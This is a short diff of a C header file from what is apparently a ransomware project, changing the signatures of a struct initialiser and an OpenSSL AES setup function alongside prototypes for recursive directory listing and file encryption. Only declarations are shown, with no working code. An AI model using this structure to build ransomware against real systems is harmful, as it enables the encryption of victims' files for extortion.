@@ -81,12 +81,12 @@ void *recalloc(void *ptr, size_t old_size, size_t new_size);
 /* OS functions */
 void *recurse_ls(char *filename, ransom_t *ransom);
 void free_ransom_struct(ransom_t *ransom);
-ransom_t *init_struct(ransom_t *ransom);
+ransom_t *init_struct(ransom_t *ransom, char *target_dir);
 size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *));
 char *write_file(char *filepath, ransom_t *ransom);
 
 /* Openssl */
-int aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *e_ctx, EVP_CIPHER_CTX *d_ctx, ransom_t *ransom);
+int aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *e_ctx, EVP_CIPHER_CTX *d_ctx);
 unsigned char *aes_encrypt(EVP_CIPHER_CTX *e, unsigned char *plaintext, int *len);
 unsigned char *aes_decrypt(EVP_CIPHER_CTX *e, unsigned char *ciphertext, int *len);
 
